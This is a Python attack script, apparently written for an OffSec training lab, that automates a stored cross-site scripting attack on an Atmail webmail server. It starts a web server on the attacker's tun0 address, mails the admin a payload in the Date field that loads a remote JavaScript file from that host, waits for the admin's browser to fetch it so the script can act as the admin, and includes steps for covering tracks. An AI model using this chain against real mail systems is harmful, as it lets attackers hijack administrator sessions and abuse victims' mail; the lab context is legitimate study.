#https://stackoverflow.com/questions/375427/a-non-blocking-read-on-a-subprocess-pipe-in-python
import os
import subprocess
import netifaces as ni
import sys
from threading  import Thread
import time


cwd = os.getcwd()
attacker_ip = ni.ifaddresses('tun0')[ni.AF_INET][0]['addr']
crsf_payload_file = 'atmail-sendmail-xhr.js'

try:
    from queue import Queue, Empty
except ImportError:
    from Queue import Queue, Empty  # python 2.x

ON_POSIX = 'posix' in sys.builtin_module_names

def enqueue_output(out, queue):
    for line in iter(out.readline, b''):
        queue.put(line)
    out.close()

if __name__ == "__main__":
    #1. Start up webserver
    webserver = subprocess.Popen(["python", "-m" "http.server", "80"], stderr=subprocess.PIPE, close_fds=ON_POSIX)
    q = Queue()
    t = Thread(target=enqueue_output, args=(webserver.stderr, q))
    t.daemon = True # thread dies with the program
    t.start()
    # 2. CSRF Create a JavaScript file on our attacking server that will be called by the tag described in step 1 
    # 3. Send an email to admin@offsec.local with a malicious payload in the Date field, that references a JavaScript file on our attacking server
    script = cwd + "/" + "atmail_sendemail.py"
    target = "atmail"
    payload = "<script src='http://" + attacker_ip + "/atmail-sendmail-xhr.js'></script>"
    status = subprocess.call([script, target, payload])
    if(status != 0):
        print("error sending mail",status)
    # 4. Wait for admin to login
    line = ''
    try: # read line without blocking
        #line = q.get_nowait() # or q.get(timeout=.1)
        line = q.get(timeout=15).decode('utf-8')
        print("here: "+ line)
        
        if 'GET /atmail-sendmail-xhr.js' in line:
            print('Recieved request for crsf payload')
    except Empty:
        print('Did not receive request for crsf payload')
    finally:
        x = 1
        time.sleep(20) # give the webserver a chance to serve payload
        webserver.terminate() # clean it up
    # 5. Cleanup our tracks
    # 6 Check our attacker mailbox
    